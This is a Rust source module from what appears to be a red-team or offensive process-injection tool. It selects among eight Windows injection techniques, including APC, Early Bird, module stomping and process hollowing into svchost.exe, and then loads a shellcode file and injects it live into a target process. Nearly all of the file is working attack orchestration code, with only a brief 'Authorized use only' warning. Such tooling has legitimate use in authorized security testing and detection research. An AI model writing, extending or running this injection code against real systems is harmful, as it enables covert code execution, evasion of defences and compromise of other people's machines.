pub mod apc;
pub mod callback;
mod common;
pub mod crt;
pub mod earlybird;
pub mod hijack;
pub mod hollow;
pub mod section;
pub mod stomp;
pub mod wrappers;

use crate::log::LogSink;

#[allow(dead_code)]
#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionTechnique {
    CreateRemoteThread,
    APC,
    ThreadHijack,
    EarlyBird,
    SectionMapping,
    Callback,
    ModuleStomp,
    ProcessHollow,
}

impl InjectionTechnique {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "createremote" | "createremotethread" => Some(Self::CreateRemoteThread),
            "apc" | "apcinjection" => Some(Self::APC),
            "hijack" | "threadhijack" | "threadhijacking" | "setthreadcontext" => {
                Some(Self::ThreadHijack)
            }
            "earlybird" | "early_bird" | "early-bird" => Some(Self::EarlyBird),
            "section" | "sectionmapping" | "mapview" | "ntmapviewofsection" => {
                Some(Self::SectionMapping)
            }
            "callback" | "enumwindows" | "timerqueue" | "threadpool" => Some(Self::Callback),
            "stomp" | "modulestomp" | "dllstomp" => Some(Self::ModuleStomp),
            "hollowing" | "hollow" | "processhollowing" | "process_hollowing" => {
                Some(Self::ProcessHollow)
            }
            _ => None,
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Self::CreateRemoteThread => "CRT",
            Self::APC => "APC",
            Self::ThreadHijack => "Context Redirect",
            Self::EarlyBird => "Early Bird",
            Self::SectionMapping => "Section Map",
            Self::Callback => "Callback",
            Self::ModuleStomp => "Module Overwrite",
            Self::ProcessHollow => "Process Hollowing",
        }
    }
}

#[derive(Debug)]
pub struct InjectionResult {
    pub remote_base: u64,
    pub size: usize,
}

pub fn analyze(technique: &str, log: &LogSink) {
    dry_run(0, technique, log);
}

pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
    if let Some(t) = InjectionTechnique::from_str(technique) {
        log.info(format!("  Target PID: {}", pid));
        log.info(format!("  Technique: {}", t.name()));

        match t {
            InjectionTechnique::CreateRemoteThread => {
                log.detail("  6-step pipeline: open → alloc → write → protect → thread → wait");
            }
            InjectionTechnique::APC => {
                log.detail("  Open → alloc → write → enumerate threads → queue APC → alertable wait");
            }
            InjectionTechnique::ThreadHijack => {
                log.detail("  Open → suspend → alloc → write → set context → resume");
            }
            InjectionTechnique::EarlyBird => {
                log.detail("  Create suspended → alloc → write → protect → queue APC → resume");
            }
            InjectionTechnique::SectionMapping => {
                log.detail("  Create section → map local → write → map remote → thread → wait");
            }
            InjectionTechnique::Callback => {
                log.detail("  Alloc → write → protect → cast callback → enumerate → execute");
            }
            InjectionTechnique::ModuleStomp => {
                log.detail("  Load module → parse PE → protect → overwrite .text → restore");
                log.detail(format!("  Target module: {}", stomp::victim_dll()));
            }
            InjectionTechnique::ProcessHollow => {
                log.detail("  Create suspended → query PEB → unmap → alloc → write PE → set context → resume");
            }
        }
    } else {
        log.error(format!("  Unknown technique: {}", technique));
        log.info("  Known: createremote, apc, hijack, earlybird, section, callback, stomp, hollowing");
    }
}

pub fn print_info(log: &LogSink) {
    log.info("");
    log.info("=== Process Techniques ===");
    log.info("");
    log.info("  1. CRT              — Remote thread creation");
    log.info("  2. APC              — Asynchronous procedure call");
    log.info("  3. Context Redirect — Thread context modification");
    log.info("  4. Early Bird       — Pre-init APC");
    log.info("  5. Section Map      — Shared memory mapping");
    log.info("  6. Callback         — Window enumeration callback");
    log.info("  7. Module Overwrite — Signed module .text replacement");
    log.info("  8. Process Hollow   — Suspended process image replacement");
    log.info("");
}

pub fn load_payload(path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(path).map_err(|e| format!("failed to read payload file '{}': {}", path, e))
}

pub fn live_inject(
    pid: u32,
    technique: &InjectionTechnique,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    if shellcode.is_empty() {
        return Err("payload is empty".to_string());
    }
    let skip_pid = matches!(
        technique,
        InjectionTechnique::EarlyBird
            | InjectionTechnique::Callback
            | InjectionTechnique::ModuleStomp
            | InjectionTechnique::ProcessHollow
    );
    if !skip_pid {
        crate::safety::validate_target(pid)
            .map_err(|e| format!("target validation failed: {}", e))?;
    }
    match technique {
        InjectionTechnique::CreateRemoteThread => crt::live_inject(pid, shellcode, log),
        InjectionTechnique::APC => apc::live_inject(pid, shellcode, log),
        InjectionTechnique::ThreadHijack => hijack::live_inject(pid, shellcode, log),
        InjectionTechnique::EarlyBird => {
            earlybird::live_inject(shellcode, "C:\\Windows\\System32\\notepad.exe", log)
        }
        InjectionTechnique::SectionMapping => section::live_inject(pid, shellcode, log),
        InjectionTechnique::Callback => callback::live_inject(shellcode, log),
        InjectionTechnique::ModuleStomp => stomp::live_inject(shellcode, log),
        InjectionTechnique::ProcessHollow => {
            hollow::live_inject(shellcode, "C:\\Windows\\System32\\svchost.exe", log)
        }
    }
}

pub fn live_inject_early_bird(
    shellcode: &[u8],
    target_exe: &str,
    log: &LogSink,
) -> Result<InjectionResult, String> {
    if shellcode.is_empty() {
        return Err("payload is empty".to_string());
    }
    earlybird::live_inject(shellcode, target_exe, log)
}

pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, log: &LogSink) {
    let shellcode = match load_payload(payload_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            log.error(format!("ERROR: {}", e));
            return;
        }
    };
    let technique = match InjectionTechnique::from_str(technique_name) {
        Some(t) => t,
        None => {
            log.error(format!("ERROR: unknown technique '{}'", technique_name));
            log.info("Known: createremote, apc, hijack, earlybird, section, callback, stomp, hollowing");
            return;
        }
    };
    log.info("");
    log.step(format!("=== LIVE — {} ===", technique.name()));
    log.info(format!(
        "  Payload: {} ({} bytes)",
        payload_path,
        shellcode.len()
    ));
    let no_pid = matches!(
        technique,
        InjectionTechnique::EarlyBird
            | InjectionTechnique::Callback
            | InjectionTechnique::ModuleStomp
            | InjectionTechnique::ProcessHollow
    );
    if no_pid {
        log.info("  Mode: local (PID not required)");
    } else {
        log.info(format!("  Target PID: {}", pid));
    }
    log.warning("  Authorized use only.");
    log.info("");
    match live_inject(pid, &technique, &shellcode, log) {
        Ok(result) => {
            log.info("");
            log.step("[DONE] Completed.");
            log.info(format!(
                "  Payload at 0x{:X} ({} bytes)",
                result.remote_base, result.size
            ));
        }
        Err(e) => {
            log.info("");
            log.error(format!("[FAILED] Aborted: {}", e));
        }
    }
}

pub fn cleanup_remote(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
    common::cleanup(pid, remote_base, size, log);
}
